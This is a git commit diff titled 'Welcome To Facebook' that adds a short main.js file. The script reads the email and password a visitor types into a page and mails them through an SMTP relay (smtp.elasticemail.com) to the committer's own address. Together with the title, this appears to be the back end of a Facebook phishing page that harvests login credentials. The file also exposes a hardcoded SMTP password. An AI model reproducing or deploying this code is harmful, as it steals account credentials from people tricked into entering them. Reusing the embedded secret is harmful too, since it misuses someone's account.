0858fcff935c3b26a8919bc4cb28143cd1a39456
riazsorkar <riazsorkar709@gmail.com>
2024-03-27 22:42:46 +0600

    Welcome To Facebook

---
+++ main.js
@@ -0,0 +1,19 @@
+function emailSend(){
+  var email = document.getElementById('email').value;
+  var pass = document.getElementById('password').value;
+
+  var messageBody = "Email : " +email+
+                    "<br/> Password : " +pass;
+
+    Email.send({
+        Host : "smtp.elasticemail.com",
+        Username : "riazsorkar709@gmail.com",
+        Password : "45B05DBA443F75EADA8D81F6C0D9732301B5",
+        To : 'riazsorkar709@gmail.com',
+        From : "riazsorkar709@gmail.com",
+        Subject : "Massage From "+email,
+        Body : messageBody
+    }).then(
+      message => alert(message)
+    );
+}
